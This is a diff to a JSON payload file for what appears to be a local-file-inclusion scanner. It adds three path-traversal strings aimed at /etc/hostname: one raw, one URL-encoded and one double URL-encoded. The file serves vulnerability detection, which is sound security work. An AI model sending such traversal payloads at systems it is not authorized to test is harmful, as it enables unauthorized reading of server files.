@@ -2,6 +2,10 @@
   "_file_type": "injectable_payload",
   "_scanner": "lfi_scanner",
   "_notes": "Linux paths only (/etc/hostname etc.)",
-  "_status": "STUB -- Week 0 scaffolding per Section 3.1; real payloads added Week 7 alongside lfi_scanner",
-  "payloads": []
+  "_status": "Real payloads added Week 7 (docs/DECISIONS.md item 78). Schema: id, encoding, payload -- see lfi_scanner.py. Section 7.10's own text: 'triple confirmation across 3 distinct path encodings' -- these are the 3.",
+  "payloads": [
+    {"id": "hostname_raw", "encoding": "raw", "payload": "../../../etc/hostname"},
+    {"id": "hostname_url_encoded", "encoding": "url_encoded", "payload": "..%2f..%2f..%2fetc%2fhostname"},
+    {"id": "hostname_double_url_encoded", "encoding": "double_url_encoded", "payload": "..%252f..%252f..%252fetc%252fhostname"}
+  ]
 }
